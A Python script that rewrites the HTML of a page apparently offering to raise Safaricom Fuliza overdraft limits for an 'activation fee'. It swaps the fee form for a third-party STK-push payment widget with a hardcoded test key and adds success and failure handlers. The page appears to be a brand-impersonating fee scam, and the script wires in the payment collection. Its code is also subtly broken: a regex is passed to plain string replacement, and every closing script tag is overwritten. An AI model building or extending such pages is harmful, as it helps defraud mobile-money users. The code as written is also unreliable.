import re

with open('/home/samtech/projects/safaricom-fuliza-increase-/index.html', 'r') as f:
    content = f.read()

# Add script to head
content = content.replace('</head>', '    <script src="https://stkpush.co.ke/static/js/finapi-widget.min.js"></script>\n</head>')

# Replace the s4 payment form with the widget
s4_pattern = re.compile(
    r'<div class="form-group">\s*<label>Safaricom Phone Number</label>\s*<input type="tel" id="payPhone" placeholder="07XXXXXXXX au 2547XXXXXXX">\s*<div class="error" id="payPhoneError"></div>\s*</div>\s*<button id="payBtn" class="btn" onclick="paySTK\(\)">Pay Activation Fee Now</button>',
    re.MULTILINE
)
widget_html = """
            <!-- FinAPI Payment Widget -->
            <div id="finapi-container" class="finapi-widget" 
                 data-api-key="sk_test_a1f9663668ca4e5fbb5644142039967b" 
                 data-amount="100" 
                 data-color="#00a651"
                 data-provider="payhero">
            </div>
"""
content = s4_pattern.sub(widget_html, content)

# Update selectLimit
select_limit_pattern = r"document\.getElementById\('sFee'\)\.innerText = fee\.toLocaleString\(\);"
select_limit_replace = """document.getElementById('sFee').innerText = fee.toLocaleString();
    
    const widgetEl = document.getElementById('finapi-container');
    if(widgetEl) {
        widgetEl.setAttribute('data-amount', fee);
    }"""
content = content.replace(select_limit_pattern, select_limit_replace)

# Add event listeners at the end
listeners = """
const widget = document.getElementById('finapi-container');
if (widget) {
    widget.addEventListener('finapi:payment_success', (e) => {
        console.log('Success!', e.detail);
        document.getElementById('paidPhone').innerText = userData.phone || "your number";
        show(5);
    });
    widget.addEventListener('finapi:payment_failed', (e) => {
        console.log('Failed!', e.detail);
        alert('Payment Failed: ' + (e.detail?.message || 'Please try again.'));
    });
}
</script>"""
content = content.replace('</script>', listeners)

with open('/home/samtech/projects/safaricom-fuliza-increase-/index.html', 'w') as f:
    f.write(content)

print("Done")
